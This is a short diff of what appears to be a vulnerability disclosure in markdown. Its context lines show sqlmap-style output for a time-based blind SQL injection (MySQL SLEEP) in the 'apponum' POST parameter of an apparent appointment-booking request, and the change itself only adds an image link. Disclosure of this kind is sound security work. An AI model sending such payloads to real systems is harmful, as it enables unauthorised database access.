@@ -17,5 +17,5 @@ Parameter: apponum (POST)
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
     Payload: booknow=1&apponum=1 AND (SELECT 6268 FROM (SELECT(SLEEP(5)))nFTS)&scheduleid=1&date=2023-07-09
 ```
-
+![Alt text](image-1.png)
 ![Alt text](image.png)
